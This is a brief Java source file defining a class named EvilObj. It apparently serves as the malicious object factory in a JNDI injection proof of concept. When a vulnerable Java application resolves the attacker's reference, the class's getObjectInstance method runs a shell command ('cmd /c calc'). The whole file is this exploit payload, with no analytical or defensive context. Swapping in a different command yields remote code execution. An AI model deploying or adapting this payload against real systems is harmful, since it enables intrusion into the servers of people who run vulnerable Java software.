package org.example;

import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

public class EvilObj implements javax.naming.spi.ObjectFactory {

    public EvilObj() {
        System.out.println("EvilObj init");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name,
                                    Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("cmd /c calc");
        return "";
    }
}
